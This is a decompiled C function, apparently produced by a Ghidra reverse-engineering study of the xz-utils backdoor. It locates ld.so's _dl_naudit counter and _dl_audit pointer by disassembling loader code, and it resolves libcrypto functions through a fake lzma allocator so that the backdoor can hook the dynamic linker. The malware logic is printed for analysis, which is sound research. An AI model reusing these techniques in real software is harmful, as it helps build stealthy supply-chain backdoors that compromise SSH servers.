// /home/kali/xzre-ghidra/xzregh/104370_find_dl_naudit.c
// Function: find_dl_naudit @ 0x104370
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_naudit(elf_info_t * dynamic_linker_elf, elf_info_t * libcrypto_elf, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Harvests the `_dl_naudit` counter and `_dl_audit` pointer from ld.so so the loader can toggle audit modules. After resolving
 * `DSA_get0_pqg`, `DSA_get0_pub_key`, and `EVP_MD_CTX_free` via the fake allocator, it finds `rtld_global_ro`, searches for the
 * `GLRO(dl_naudit)` string reference, and decodes the MOV that loads that slot. The same memory address is then matched inside
 * `_dl_audit_symbind_alt`; if the MOV/TEST pair is found and the slot is still zero, the function records the `_dl_naudit` and
 * `_dl_audit` pointers in `hooks->ldso_ctx`. Any deviation or pre-existing audit module aborts the attempt.
 */

#include "xzre_types.h"

BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
                   backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  Elf64_Addr dsa_get0_pqg_value;
  Elf64_Ehdr *libcrypto_ehdr;
  Elf64_Xword rtld_global_ro_size;
  dl_audit_symbind_alt_fn audit_symbind_alt;
  BOOL success;
  Elf64_Sym *pEVar5;
  char *str;
  Elf64_Sym *dsa_get0_pqg_symbol;
  u8 *string_ref;
  uchar *rtld_global_ro_ptr;
  lzma_allocator *allocator;
  pfn_EVP_MD_CTX_free_t evp_md_ctx_free_fn;
  uint *slot_ptr;
  pfn_DSA_get0_pub_key_t dsa_get0_pub_key_fn;
  long clear_idx;
  dasm_ctx_t *dasm_cursor;
  u8 *scan_cursor;
  uint *glro_slot_ptr;
  u8 zero_seed;
  EncodedStringId glro_naudit_string_id;
  u64 ldso_code_size;
  dasm_ctx_t insn_ctx;
  
  zero_seed = 0;
  glro_naudit_string_id = 0;
  ldso_code_size = 0;
  pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
  if (pEVar5 != (Elf64_Sym *)0x0) {
    glro_naudit_string_id = STR_GLRO_dl_naudit_naudit;
    str = elf_find_string(dynamic_linker_elf,&glro_naudit_string_id,(void *)0x0);
    if (str != (char *)0x0) {
      dsa_get0_pqg_symbol = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
      string_ref = (u8 *)elf_get_code_segment(dynamic_linker_elf,&ldso_code_size);
      if ((string_ref != (u8 *)0x0) &&
         (string_ref = find_string_reference(string_ref,string_ref + ldso_code_size,str), string_ref != (u8 *)0x0)) {
        if (dsa_get0_pqg_symbol != (Elf64_Sym *)0x0) {
          dsa_get0_pqg_value = dsa_get0_pqg_symbol->st_value;
          libcrypto_ehdr = libcrypto_elf->elfbase;
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          imported_funcs->DSA_get0_pqg = (pfn_DSA_get0_pqg_t)(libcrypto_ehdr->e_ident + dsa_get0_pqg_value);
        }
        dasm_cursor = &insn_ctx;
        for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
          *(undefined4 *)&dasm_cursor->instruction = 0;
          dasm_cursor = (dasm_ctx_t *)((long)dasm_cursor + (ulong)zero_seed * -8 + 4);
        }
        rtld_global_ro_ptr = dynamic_linker_elf->elfbase->e_ident + pEVar5->st_value;
        rtld_global_ro_size = pEVar5->st_size;
        allocator = get_lzma_allocator();
        allocator->opaque = libcrypto_elf;
        evp_md_ctx_free_fn = (pfn_EVP_MD_CTX_free_t)lzma_alloc(0xd10,allocator);
        imported_funcs->EVP_MD_CTX_free = evp_md_ctx_free_fn;
        if (evp_md_ctx_free_fn != (pfn_EVP_MD_CTX_free_t)0x0) {
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        }
        glro_slot_ptr = (uint *)0x0;
        scan_cursor = string_ref + -0x80;
        while (scan_cursor < string_ref) {
          success = find_instruction_with_mem_operand_ex
                            (scan_cursor,string_ref,&insn_ctx,0x10b,(void *)0x0);
          scan_cursor = scan_cursor + 1;
          if (success != FALSE) {
            if ((insn_ctx.prefix.decoded.flags2 & 1) != 0) {
              slot_ptr = (uint *)insn_ctx.mem_disp;
              if (((uint)insn_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                slot_ptr = (uint *)((u8 *)(insn_ctx.mem_disp + (long)insn_ctx.instruction) +
                                  insn_ctx.instruction_size);
              }
              if (((((byte)insn_ctx.prefix.decoded.rex & 0x48) != 0x48) && (rtld_global_ro_ptr < slot_ptr)) &&
                 (slot_ptr + 1 <= rtld_global_ro_ptr + rtld_global_ro_size)) {
                glro_slot_ptr = slot_ptr;
              }
            }
            scan_cursor = insn_ctx.instruction + (ulong)insn_ctx.insn_offset + 1;
          }
        }
        if ((glro_slot_ptr == (uint *)0x0) ||
           (audit_symbind_alt = (hooks->ldso_ctx)._dl_audit_symbind_alt,
           success = find_instruction_with_mem_operand_ex
                             ((u8 *)audit_symbind_alt,
                              (u8 *)(audit_symbind_alt + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                              (dasm_ctx_t *)0x0,0x10b,glro_slot_ptr), success == FALSE)) {
          dsa_get0_pub_key_fn = (pfn_DSA_get0_pub_key_t)imported_funcs->EVP_MD_CTX_free;
        }
        else {
          dsa_get0_pub_key_fn = (pfn_DSA_get0_pub_key_t)lzma_alloc(0x468,allocator);
          imported_funcs->DSA_get0_pub_key = dsa_get0_pub_key_fn;
          if (dsa_get0_pub_key_fn != (pfn_DSA_get0_pub_key_t)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          if ((*glro_slot_ptr == 0) && (*(long *)(glro_slot_ptr + -2) == 0)) {
            (hooks->ldso_ctx)._dl_naudit_ptr = glro_slot_ptr;
            (hooks->ldso_ctx)._dl_audit_ptr = (audit_ifaces **)(glro_slot_ptr + -2);
            return TRUE;
          }
          lzma_free(imported_funcs->EVP_MD_CTX_free,allocator);
          dsa_get0_pub_key_fn = imported_funcs->DSA_get0_pub_key;
        }
        lzma_free(dsa_get0_pub_key_fn,allocator);
      }
    }
  }
  return FALSE;
}

